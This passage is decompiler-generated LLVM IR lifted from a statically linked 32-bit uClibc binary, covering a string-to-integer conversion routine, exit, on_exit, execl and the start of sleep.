  %v2_8053c3d = mul nsw i32 %v3_8053c3a, 2
  %v3_8053c3d = add i32 %v2_8053c3d, %v0_8053c2f
  %v4_8053c3d = inttoptr i32 %v3_8053c3d to i8*
  %v5_8053c3d = load i8, i8* %v4_8053c3d, align 1
  %v6_8053c3d = and i8 %v5_8053c3d, 32
  %v7_8053c3d = icmp eq i8 %v6_8053c3d, 0
  %v1_8053c41 = icmp eq i1 %v7_8053c3d, false
  br i1 %v1_8053c41, label %dec_label_pc_8053c39, label %dec_label_pc_8053c43

dec_label_pc_8053c43:                             ; preds = %dec_label_pc_8053c39, %entry
  %v0_8053c39.lcssa = phi i32 [ %v4_8053c27, %entry ], [ %v1_8053c39, %dec_label_pc_8053c39 ]
  %v2_8053c3a.lcssa = phi i8 [ %v2_8053c3a40, %entry ], [ %v2_8053c3a, %dec_label_pc_8053c39 ]
  %v3_8053c3a.lcssa = phi i32 [ %v3_8053c3a41, %entry ], [ %v3_8053c3a, %dec_label_pc_8053c39 ]
  %tmp36 = trunc i32 %arg4 to i8
  %v9_8053c43 = icmp eq i8 %v2_8053c3a.lcssa, 43
  br i1 %v9_8053c43, label %dec_label_pc_8053c5e, label %dec_label_pc_8053c48

dec_label_pc_8053c48:                             ; preds = %dec_label_pc_8053c43
  %v9_8053c48 = icmp eq i8 %v2_8053c3a.lcssa, 45
  %v1_8053c50 = icmp eq i1 %v9_8053c48, false
  br i1 %v1_8053c50, label %dec_label_pc_8053c5f, label %dec_label_pc_8053c5e

dec_label_pc_8053c5e:                             ; preds = %dec_label_pc_8053c43, %dec_label_pc_8053c48
  %storemerge4 = phi i8 [ 1, %dec_label_pc_8053c48 ], [ 0, %dec_label_pc_8053c43 ]
  %v1_8053c5e = add i32 %v0_8053c39.lcssa, 1
  store i32 %v1_8053c5e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c5f

dec_label_pc_8053c5f:                             ; preds = %dec_label_pc_8053c48, %dec_label_pc_8053c5e
  %v0_8053c71 = phi i32 [ %v1_8053c5e, %dec_label_pc_8053c5e ], [ %v0_8053c39.lcssa, %dec_label_pc_8053c48 ]
  %stack_var_-18.0 = phi i8 [ %storemerge4, %dec_label_pc_8053c5e ], [ 0, %dec_label_pc_8053c48 ]
  %v1_8053c5f = and i32 %arg3, -17
  %v2_8053c5f = icmp eq i32 %v1_8053c5f, 0
  %v1_8053c67 = icmp eq i1 %v2_8053c5f, false
  br i1 %v1_8053c67, label %dec_label_pc_8053c8d, label %dec_label_pc_8053c69

dec_label_pc_8053c69:                             ; preds = %dec_label_pc_8053c5f
  %v1_8053c69 = add i32 %arg3, 10
  store i32 %v1_8053c69, i32* %esi.global-to-local, align 4
  %v1_8053c6c = inttoptr i32 %v0_8053c71 to i8*
  %v2_8053c6c = load i8, i8* %v1_8053c6c, align 1
  %v8_8053c6c = icmp eq i8 %v2_8053c6c, 48
  %v1_8053c6f = icmp eq i1 %v8_8053c6c, false
  br i1 %v1_8053c6f, label %dec_label_pc_8053c82, label %dec_label_pc_8053c71

dec_label_pc_8053c71:                             ; preds = %dec_label_pc_8053c69
  %v1_8053c71 = add i32 %v0_8053c71, 1
  store i32 %v1_8053c71, i32* %ebx.global-to-local, align 4
  %v1_8053c72 = add i32 %arg3, 8
  store i32 %v1_8053c72, i32* %esi.global-to-local, align 4
  %v1_8053c75 = inttoptr i32 %v1_8053c71 to i8*
  %v2_8053c75 = load i8, i8* %v1_8053c75, align 1
  %v2_8053c79 = or i8 %v2_8053c75, 32
  %v7_8053c79 = zext i8 %v2_8053c79 to i32
  %v9_8053c79 = and i32 %v3_8053c3a.lcssa, -256
  %v10_8053c79 = or i32 %v7_8053c79, %v9_8053c79
  store i32 %v10_8053c79, i32* %eax.global-to-local, align 4
  %v10_8053c7b = icmp eq i8 %v2_8053c79, 120
  %v1_8053c7d = icmp eq i1 %v10_8053c7b, false
  br i1 %v1_8053c7d, label %dec_label_pc_8053c82, label %dec_label_pc_8053c7f

dec_label_pc_8053c7f:                             ; preds = %dec_label_pc_8053c71
  %v2_8053c7f = mul i32 %v1_8053c72, 2
  store i32 %v2_8053c7f, i32* %esi.global-to-local, align 4
  %v1_8053c81 = add i32 %v0_8053c71, 2
  store i32 %v1_8053c81, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c82

dec_label_pc_8053c82:                             ; preds = %dec_label_pc_8053c71, %dec_label_pc_8053c69, %dec_label_pc_8053c7f
  %v0_8053caa12 = phi i32 [ %v1_8053c71, %dec_label_pc_8053c71 ], [ %v0_8053c71, %dec_label_pc_8053c69 ], [ %v1_8053c81, %dec_label_pc_8053c7f ]
  %v0_8053d0421 = phi i32 [ %v1_8053c71, %dec_label_pc_8053c71 ], [ %v4_8053c27, %dec_label_pc_8053c69 ], [ %v1_8053c71, %dec_label_pc_8053c7f ]
  %v3_8053c8a = phi i32 [ %v1_8053c72, %dec_label_pc_8053c71 ], [ %v1_8053c69, %dec_label_pc_8053c69 ], [ %v2_8053c7f, %dec_label_pc_8053c7f ]
  %v1_8053c82 = add i32 %v3_8053c8a, -17
  %v6_8053c82 = sub i32 16, %v3_8053c8a
  %v7_8053c82 = and i32 %v6_8053c82, %v3_8053c8a
  %v8_8053c82 = icmp slt i32 %v7_8053c82, 0
  %v10_8053c82 = icmp slt i32 %v1_8053c82, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8053c8a = icmp eq i1 %v10_8053c82, %v8_8053c82
  %v5_8053c8a = select i1 %v2_8053c8a, i32 16, i32 %v3_8053c8a
  store i32 %v5_8053c8a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053c8d

dec_label_pc_8053c8d:                             ; preds = %dec_label_pc_8053c5f, %dec_label_pc_8053c82
  %v0_8053d0422 = phi i32 [ %v4_8053c27, %dec_label_pc_8053c5f ], [ %v0_8053d0421, %dec_label_pc_8053c82 ]
  %v0_8053caa11 = phi i32 [ %v0_8053c71, %dec_label_pc_8053c5f ], [ %v0_8053caa12, %dec_label_pc_8053c82 ]
  %v0_8053c9c = phi i32 [ %arg3, %dec_label_pc_8053c5f ], [ %v5_8053c8a, %dec_label_pc_8053c82 ]
  %v1_8053c8d = add i32 %v0_8053c9c, -2
  store i32 %v1_8053c8d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8053c95 = icmp ugt i32 %v1_8053c8d, 34
  br i1 %v6_8053c95, label %dec_label_pc_8053cf9, label %dec_label_pc_8053c97

dec_label_pc_8053c97:                             ; preds = %dec_label_pc_8053c8d
  %div = udiv i32 -1, %v0_8053c9c
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp37 = urem i32 -1, %v0_8053c9c
  %v1_8053c9e = trunc i32 %tmp37 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8053cd7 = urem i32 %arg4, 256
  br label %dec_label_pc_8053caa

dec_label_pc_8053ca8:                             ; preds = %dec_label_pc_8053cef, %dec_label_pc_8053cd7
  %v2_8053cac.pre = phi i32 [ %v0_8053cf2, %dec_label_pc_8053cef ], [ %v2_8053cac.pre.pre, %dec_label_pc_8053cd7 ]
  %v4_8053caa.pre = phi i32 [ %v1_8053cc3, %dec_label_pc_8053cef ], [ %v4_8053caa.pre.pre, %dec_label_pc_8053cd7 ]
  %v0_8053ca8 = phi i32 [ %v1_8053cca, %dec_label_pc_8053cef ], [ %v0_8053ca8.pre, %dec_label_pc_8053cd7 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8053cef ], [ %v6_8053cdb, %dec_label_pc_8053cd7 ]
  br label %dec_label_pc_8053caa

dec_label_pc_8053caa:                             ; preds = %dec_label_pc_8053c97, %dec_label_pc_8053ca8
  %v0_8053d0420 = phi i32 [ %v0_8053d0422, %dec_label_pc_8053c97 ], [ %v0_8053ca8, %dec_label_pc_8053ca8 ]
  %v0_8053cca = phi i32 [ %v0_8053caa11, %dec_label_pc_8053c97 ], [ %v0_8053ca8, %dec_label_pc_8053ca8 ]
  %v2_8053cac = phi i32 [ %v4_8053c27, %dec_label_pc_8053c97 ], [ %v2_8053cac.pre, %dec_label_pc_8053ca8 ]
  %v4_8053caa = phi i32 [ %div, %dec_label_pc_8053c97 ], [ %v4_8053caa.pre, %dec_label_pc_8053ca8 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8053c97 ], [ %stack_var_-18.1, %dec_label_pc_8053ca8 ]
  %v1_8053caa = inttoptr i32 %v0_8053cca to i8*
  %v2_8053caa = load i8, i8* %v1_8053caa, align 1
  %v3_8053caa = zext i8 %v2_8053caa to i32
  %v5_8053caa = and i32 %v4_8053caa, -256
  %v6_8053caa = or i32 %v3_8053caa, %v5_8053caa
  store i32 %v6_8053caa, i32* %eax.global-to-local, align 4
  %v2_8053cae = add i8 %v2_8053caa, -48
  %v12_8053cae = zext i8 %v2_8053cae to i32
  %v14_8053cae = and i32 %v2_8053cac, -256
  %v15_8053cae = or i32 %v12_8053cae, %v14_8053cae
  store i32 %v15_8053cae, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8053cae, 10
  br i1 %tmp, label %dec_label_pc_8053cc3, label %dec_label_pc_8053cb6

dec_label_pc_8053cb6:                             ; preds = %dec_label_pc_8053caa
  %v2_8053cb6 = or i8 %v2_8053caa, 32
  %v7_8053cb6 = zext i8 %v2_8053cb6 to i32
  %v10_8053cb6 = or i32 %v7_8053cb6, %v5_8053caa
  store i32 %v10_8053cb6, i32* %eax.global-to-local, align 4
  %v2_8053cb8 = or i32 %v14_8053cae, 40
  store i32 %v2_8053cb8, i32* @ecx, align 4
  %tmp54 = icmp ult i8 %v2_8053cb6, 97
  br i1 %tmp54, label %dec_label_pc_8053cc3, label %dec_label_pc_8053cbe

dec_label_pc_8053cbe:                             ; preds = %dec_label_pc_8053cb6
  %v2_8053cc0 = add i8 %v2_8053cb6, -87
  %v15_8053cc0 = zext i8 %v2_8053cc0 to i32
  %v18_8053cc0 = or i32 %v15_8053cc0, %v14_8053cae
  store i32 %v18_8053cc0, i32* @ecx, align 4
  br label %dec_label_pc_8053cc3

dec_label_pc_8053cc3:                             ; preds = %dec_label_pc_8053cb6, %dec_label_pc_8053caa, %dec_label_pc_8053cbe
  %v0_8053cf2 = phi i32 [ %v2_8053cb8, %dec_label_pc_8053cb6 ], [ %v15_8053cae, %dec_label_pc_8053caa ], [ %v18_8053cc0, %dec_label_pc_8053cbe ]
  %v1_8053cc3 = urem i32 %v0_8053cf2, 256
  store i32 %v1_8053cc3, i32* %eax.global-to-local, align 4
  %v1_8053cc6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053cc6 = sub i32 %v1_8053cc3, %v1_8053cc6
  %v10_8053cc6 = and i32 %v2_8053cc6, %v1_8053cc6
  %v11_8053cc6 = icmp slt i32 %v10_8053cc6, 0
  %v13_8053cc6 = icmp slt i32 %v2_8053cc6, 0
  %v2_8053cc8 = icmp eq i1 %v13_8053cc6, %v11_8053cc6
  br i1 %v2_8053cc8, label %dec_label_pc_8053cf9, label %dec_label_pc_8053cca

dec_label_pc_8053cca:                             ; preds = %dec_label_pc_8053cc3
  %v1_8053cca = add i32 %v0_8053cca, 1
  store i32 %v1_8053cca, i32* %ebx.global-to-local, align 4
  %v0_8053ccb = load i32, i32* %edx.global-to-local, align 4
  %v1_8053ccb = load i32, i32* %ebp.global-to-local, align 4
  %tmp55 = icmp ugt i32 %v0_8053ccb, %v1_8053ccb
  br i1 %tmp55, label %dec_label_pc_8053cd7, label %dec_label_pc_8053ccf

dec_label_pc_8053ccf:                             ; preds = %dec_label_pc_8053cca
  %v12_8053ccb = icmp eq i32 %v0_8053ccb, %v1_8053ccb
  %v1_8053ccf = icmp eq i1 %v12_8053ccb, false
  br i1 %v1_8053ccf, label %dec_label_pc_8053cef, label %dec_label_pc_8053cd1

dec_label_pc_8053cd1:                             ; preds = %dec_label_pc_8053ccf
  %v1_8053cd1 = trunc i32 %v0_8053cf2 to i8
  %tmp56 = icmp ugt i8 %v1_8053cd1, %v1_8053c9e
  br i1 %tmp56, label %dec_label_pc_8053cd7, label %dec_label_pc_8053cef

dec_label_pc_8053cd7:                             ; preds = %dec_label_pc_8053cd1, %dec_label_pc_8053cca
  store i32 %v4_8053cd7, i32* %eax.global-to-local, align 4
  %v6_8053cdb = and i8 %stack_var_-18.2, %tmp36
  %v1_8053cdf = sext i8 %v6_8053cdb to i32
  %v2_8053cdf = call i32 @__errno_location(i32 %v1_8053cdf)
  store i32 %v2_8053cdf, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8053ce7 = inttoptr i32 %v2_8053cdf to i32*
  store i32 34, i32* %v1_8053ce7, align 4
  %v0_8053ca8.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053caa.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8053cac.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053ca8

dec_label_pc_8053cef:                             ; preds = %dec_label_pc_8053cd1, %dec_label_pc_8053ccf
  %v4_8053cef = mul i32 %v0_8053ccb, %v1_8053cc6
  store i32 %v1_8053cc3, i32* %eax.global-to-local, align 4
  %v2_8053cf5 = add i32 %v4_8053cef, %v1_8053cc3
  store i32 %v2_8053cf5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ca8

dec_label_pc_8053cf9:                             ; preds = %dec_label_pc_8053cc3, %dec_label_pc_8053c8d
  %v0_8053d04 = phi i32 [ %v0_8053d0422, %dec_label_pc_8053c8d ], [ %v0_8053d0420, %dec_label_pc_8053cc3 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8053c8d ], [ %stack_var_-18.2, %dec_label_pc_8053cc3 ]
  %v4_8053cf9 = icmp eq i32 %arg2, 0
  br i1 %v4_8053cf9, label %dec_label_pc_8053d06, label %dec_label_pc_8053d00

dec_label_pc_8053d00:                             ; preds = %dec_label_pc_8053cf9
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053d04 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053d04, i32* %v2_8053d04, align 4
  br label %dec_label_pc_8053d06

dec_label_pc_8053d06:                             ; preds = %dec_label_pc_8053cf9, %dec_label_pc_8053d00
  %v8_8053d06 = icmp eq i8 %stack_var_-18.3, 0
  %v2_8053d0b = zext i1 %v8_8053d06 to i32
  %v13_8053d0b = icmp eq i1 %v8_8053d06, false
  %v1_8053d0d2 = or i32 %v2_8053d0b, -2147483648
  store i32 %v1_8053d0d2, i32* %ebx.global-to-local, align 4
  %v5_8053d13 = icmp eq i8 %tmp36, 0
  br i1 %v5_8053d13, label %dec_label_pc_8053d2b, label %dec_label_pc_8053d1a

dec_label_pc_8053d1a:                             ; preds = %dec_label_pc_8053d06
  %v0_8053d1a = load i32, i32* %edx.global-to-local, align 4
  %tmp57 = icmp ugt i32 %v0_8053d1a, %v1_8053d0d2
  br i1 %tmp57, label %dec_label_pc_8053d1e, label %dec_label_pc_8053d2b

dec_label_pc_8053d1e:                             ; preds = %dec_label_pc_8053d1a
  %v1_8053d1e = sext i8 %stack_var_-18.3 to i32
  %v2_8053d1e = call i32 @__errno_location(i32 %v1_8053d1e)
  store i32 %v2_8053d1e, i32* %eax.global-to-local, align 4
  %v0_8053d23 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053d23, i32* %edx.global-to-local, align 4
  %v1_8053d25 = inttoptr i32 %v2_8053d1e to i32*
  store i32 34, i32* %v1_8053d25, align 4
  br label %dec_label_pc_8053d2b

dec_label_pc_8053d2b:                             ; preds = %dec_label_pc_8053d1a, %dec_label_pc_8053d06, %dec_label_pc_8053d1e
  %v0_8053d2b = load i32, i32* %edx.global-to-local, align 4
  %v1_8053d2d = sub i32 0, %v0_8053d2b
  %v4_8053d34 = select i1 %v13_8053d0b, i32 %v1_8053d2d, i32 %v0_8053d2b
  store i32 %v4_8053d34, i32* @edx, align 4
  %v2_8053d3a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053d3a, i32* @ebx, align 4
  store i32 %v4_8053d34, i32* %eax.global-to-local, align 4
  ret i32 %v4_8053d34

; uselistorder directives
  uselistorder i32 %v4_8053d34, { 1, 0, 2 }
  uselistorder i1 %v8_8053d06, { 1, 0 }
  uselistorder i8 %v6_8053cdb, { 1, 0 }
  uselistorder i32 %v1_8053ccb, { 1, 0 }
  uselistorder i32 %v0_8053ccb, { 2, 1, 0 }
  uselistorder i32 %v1_8053cca, { 1, 0 }
  uselistorder i32 %v2_8053cc6, { 1, 0 }
  uselistorder i32 %v1_8053cc3, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053cf2, { 2, 0, 1 }
  uselistorder i8 %v2_8053cb6, { 1, 0, 2 }
  uselistorder i32 %v14_8053cae, { 0, 2, 1 }
  uselistorder i32 %v0_8053ca8, { 1, 0 }
  uselistorder i32 %v0_8053c9c, { 1, 0, 2 }
  uselistorder i32 %v3_8053c8a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8053c7f, { 1, 0 }
  uselistorder i32 %v1_8053c72, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8053c71, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp36, { 1, 0 }
  uselistorder i8 %v2_8053c3a.lcssa, { 1, 0 }
  uselistorder i32 %v0_8053c39.lcssa, { 1, 0 }
  uselistorder i32 %v1_8053c39, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8053c2f, { 1, 0, 2 }
  uselistorder i32 %v4_8053c27, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i32 -17, { 1, 3, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d2b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053d06, { 1, 0 }
  uselistorder label %dec_label_pc_8053cc3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053caa, { 1, 0 }
  uselistorder label %dec_label_pc_8053c8d, { 1, 0 }
  uselistorder label %dec_label_pc_8053c82, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053c5f, { 1, 0 }
  uselistorder label %dec_label_pc_8053c5e, { 1, 0 }
  uselistorder label %dec_label_pc_8053c39, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053d57 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053d57, i32* @ebx, align 4
  %v4_8053d5c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134541533, i32 ptrtoint (i32* @global_var_8062da0.263 to i32))
  %v1_8053d68 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062da0.263 to i32))
  %v0_8053d6d = load i32, i32* @global_var_8067644.264, align 4
  %v1_8053d75 = icmp eq i32 %v0_8053d6d, 0
  br i1 %v1_8053d75, label %dec_label_pc_8053d82, label %dec_label_pc_8053d79

dec_label_pc_8053d79:                             ; preds = %entry
  %v0_8053d7c = load i32, i32* @esi, align 4
  %v1_8053d7d = call i32 @unknown_0(i32 %v0_8053d7c)
  br label %dec_label_pc_8053d82

dec_label_pc_8053d82:                             ; preds = %entry, %dec_label_pc_8053d79
  %v3_8053d87 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8053d8c = call i32 @__GI___uClibc_fini()
  %v0_8053d9d = call i32 @_stdio_term()
  %v0_8053da5 = load i32, i32* @esi, align 4
  %v1_8053da6 = call i32 @__GI__exit(i32 %v0_8053da5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 6, 1, 3, 0, 7, 5, 4 }
  uselistorder label %dec_label_pc_8053d82, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8053daf = call i32 @__new_exitfn()
  store i32 -1, i32* %eax.global-to-local, align 4
  %v1_8053db9 = icmp eq i32 %v0_8053daf, 0
  br i1 %v1_8053db9, label %dec_label_pc_8053dd3, label %dec_label_pc_8053dbd

dec_label_pc_8053dbd:                             ; preds = %entry
  %v2_8053dc1 = add i32 %v0_8053daf, 4
  %v3_8053dc1 = inttoptr i32 %v2_8053dc1 to i32*
  store i32 %arg1, i32* %v3_8053dc1, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_8053dc8 = inttoptr i32 %v0_8053daf to i32*
  store i32 2, i32* %v1_8053dc8, align 4
  %v0_8053dce = load i32, i32* %eax.global-to-local, align 4
  %v2_8053dce = add i32 %v0_8053daf, 8
  %v3_8053dce = inttoptr i32 %v2_8053dce to i32*
  store i32 %v0_8053dce, i32* %v3_8053dce, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053dd3

dec_label_pc_8053dd3:                             ; preds = %entry, %dec_label_pc_8053dbd
  %v0_8053dd6 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8053dbd ]
  ret i32 %v0_8053dd6

; uselistorder directives
  uselistorder i32 %v0_8053daf, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053dd3, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8053dde = load i32, i32* @ebx, align 4
  store i32 %v0_8053dde, i32* %stack_var_-12, align 4
  %v2_8053ddf = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8053ddf, i32* %eax.global-to-local, align 4
  %v12_8053de2 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053de8

dec_label_pc_8053de8:                             ; preds = %dec_label_pc_8053de8, %entry
  %v0_8053deb = phi i32 [ 0, %entry ], [ %v1_8053deb, %dec_label_pc_8053de8 ]
  %stack_var_-16.0 = phi i32 [ %v2_8053ddf, %entry ], [ %v1_8053dec, %dec_label_pc_8053de8 ]
  %v1_8053deb = add i32 %v0_8053deb, 1
  store i32 %v1_8053deb, i32* %esi.global-to-local, align 4
  %v1_8053dec = add i32 %stack_var_-16.0, 4
  store i32 %v1_8053dec, i32* %eax.global-to-local, align 4
  %v1_8053df2 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8053df2 = load i32, i32* %v1_8053df2, align 4
  %v3_8053df2 = icmp eq i32 %v2_8053df2, 0
  %v1_8053df5 = icmp eq i1 %v3_8053df2, false
  br i1 %v1_8053df5, label %dec_label_pc_8053de8, label %dec_label_pc_8053df7

dec_label_pc_8053df7:                             ; preds = %dec_label_pc_8053de8
  %v1_8053df7 = mul i32 %v1_8053deb, 4
  %v2_8053df7 = add i32 %v1_8053df7, 34
  %v1_8053dfe = and i32 %v2_8053df7, -16
  %v2_8053e01 = sub i32 %v12_8053de2, %v1_8053dfe
  %v1_8053e06 = add i32 %v2_8053e01, 15
  %v1_8053e0a = and i32 %v1_8053e06, -16
  store i32 %v1_8053e0a, i32* @ebx, align 4
  store i32 %v1_8053e0a, i32* %ecx.global-to-local, align 4
  %v2_8053e0f = inttoptr i32 %v1_8053e0a to i32*
  store i32 %arg2, i32* %v2_8053e0f, align 16
  store i32 %v2_8053ddf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e17

dec_label_pc_8053e17:                             ; preds = %dec_label_pc_8053e17, %dec_label_pc_8053df7
  %stack_var_-16.1 = phi i32 [ %v2_8053ddf, %dec_label_pc_8053df7 ], [ %v1_8053e1e, %dec_label_pc_8053e17 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8053e1a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053e1a = add i32 %v0_8053e1a, 4
  store i32 %v1_8053e1a, i32* %ecx.global-to-local, align 4
  %v0_8053e1d = load i32, i32* %esi.global-to-local, align 4
  %v1_8053e1d = add i32 %v0_8053e1d, -1
  %v8_8053e1d = icmp eq i32 %v1_8053e1d, 0
  store i32 %v1_8053e1d, i32* %esi.global-to-local, align 4
  %v1_8053e1e = add i32 %stack_var_-16.1, 4
  %v1_8053e24 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8053e24 = load i32, i32* %v1_8053e24, align 4
  store i32 %v2_8053e24, i32* %eax.global-to-local, align 4
  %v2_8053e26 = inttoptr i32 %v1_8053e1a to i32*
  store i32 %v2_8053e24, i32* %v2_8053e26, align 4
  %v1_8053e28 = icmp eq i1 %v8_8053e1d, false
  br i1 %v1_8053e28, label %dec_label_pc_8053e17, label %dec_label_pc_8053e2a

dec_label_pc_8053e2a:                             ; preds = %dec_label_pc_8053e17
  %v0_8053e2a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e2a = load i32, i32* @esp, align 4
  %v2_8053e2a = add i32 %v1_8053e2a, -4
  %v3_8053e2a = inttoptr i32 %v2_8053e2a to i32*
  store i32 %v0_8053e2a, i32* %v3_8053e2a, align 4
  %v0_8053e2b = load i32, i32* @global_var_8067650.265, align 16
  %v2_8053e2b = add i32 %v1_8053e2a, -8
  %v3_8053e2b = inttoptr i32 %v2_8053e2b to i32*
  store i32 %v0_8053e2b, i32* %v3_8053e2b, align 4
  %v0_8053e31 = load i32, i32* @ebx, align 4
  %v2_8053e31 = add i32 %v1_8053e2a, -12
  %v3_8053e31 = inttoptr i32 %v2_8053e31 to i32*
  store i32 %v0_8053e31, i32* %v3_8053e31, align 4
  %v5_8053e32 = add i32 %v1_8053e2a, -16
  %v6_8053e32 = inttoptr i32 %v5_8053e32 to i32*
  store i32 %arg1, i32* %v6_8053e32, align 4
  %v1_8053e35 = inttoptr i32 %v1_8053e1e to i8*
  %v2_8053e35 = call i32 @__GI_execve(i8* %v1_8053e35)
  store i32 %v2_8053e35, i32* %eax.global-to-local, align 4
  %v2_8053e3d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053e3d, i32* @ebx, align 4
  ret i32 %v2_8053e35

; uselistorder directives
  uselistorder i32 %v1_8053e1d, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8053dec, { 1, 0 }
  uselistorder i32 %v1_8053deb, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8053ddf, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053e44 = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_8053e4a = load i32, i32* @edi, align 4
  %v0_8053e4b = load i32, i32* @esi, align 4
  %v0_8053e4c = load i32, i32* @ebx, align 4
  %v15_8053e4d = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_8053e5a = icmp eq i32 %arg1, 0
  %v1_8053e5c = icmp eq i1 %v1_8053e5a, false
  br i1 %v1_8053e5c, label %dec_label_pc_8053e6e.preheader, label %dec_label_pc_8053fbb

dec_label_pc_8053e6e.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e63

dec_label_pc_8053e63:                             ; preds = %dec_label_pc_8053e63.dec_label_pc_8053e63_crit_edge, %dec_label_pc_8053e6e.preheader
  %v0_8053e63 = phi i32 [ %v15_8053e4d, %dec_label_pc_8053e6e.preheader ], [ %v0_8053e63.pre, %dec_label_pc_8053e63.dec_label_pc_8053e63_crit_edge ]
  %v1_8053e6e29 = phi i32 [ 31, %dec_label_pc_8053e6e.preheader ], [ %v1_8053e6e, %dec_label_pc_8053e63.dec_label_pc_8053e63_crit_edge ]
  %v2_8053e63 = mul i32 %v1_8053e6e29, 4
  %v3_8053e63 = add i32 %v2_8053e63, 292
  %v4_8053e63 = add i32 %v3_8053e63, %v0_8053e63
  %v5_8053e63 = inttoptr i32 %v4_8053e63 to i32*
  store i32 0, i32* %v5_8053e63, align 4
  %v0_8053e6e.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e6e = add i32 %v0_8053e6e.pre, -1
  %v9_8053e6e = icmp slt i32 %v1_8053e6e, 0
  store i32 %v1_8053e6e, i32* %eax.global-to-local, align 4
  %v1_8053e6f = icmp eq i1 %v9_8053e6e, false
  br i1 %v1_8053e6f, label %dec_label_pc_8053e63.dec_label_pc_8053e63_crit_edge, label %dec_label_pc_8053e71

